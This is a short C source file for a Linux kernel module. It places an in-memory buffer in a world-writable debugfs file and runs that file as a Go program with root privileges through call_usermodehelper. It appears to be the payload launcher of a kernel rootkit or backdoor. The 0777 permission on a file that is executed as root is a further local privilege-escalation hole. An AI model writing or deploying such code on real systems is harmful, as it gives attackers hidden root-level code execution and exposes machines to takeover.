#include "debugfs.h"

extern unsigned char *buffer;
extern unsigned long buffer_length;
extern struct task_struct *task;

struct dentry *dfs = NULL;
struct debugfs_blob_wrapper *myblob;

void destroy_file(void){
	if (dfs){
		debugfs_remove(dfs);
	}
}

void execute_file(void){
    static char *envp[] = {
        "SHELL=/bin/bash",
        "HOME=/root/",
        "USER=root",
        "PATH=/usr/local/sbin:/usr/local/bin:"\
                "/usr/sbin:/usr/bin:/sbin:/bin",
        "DISPLAY=:0",
        "PWD=/", 
        NULL};

    char *argv[] = {"/usr/bin/go", "run", "/sys/kernel/debug/debug_exec.go", NULL};

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

int create_file(void){
    /* get mem for blob struct and init */
    myblob = kmalloc(sizeof(struct debugfs_blob_wrapper), GFP_KERNEL);
	if (myblob == NULL){
		return -ENOMEM;
	}

    /* only set data pointer and data size */
	myblob->data = (void *) buffer;
	myblob->size = (unsigned long) buffer_length;

    /* create pseudo file under /sys/kernel/debug_exec */
    dfs = debugfs_create_blob("debug_exec", 0777, NULL, myblob);
	if (!dfs){
		kfree(myblob);
		return -EINVAL;
	}

	return 0;
}
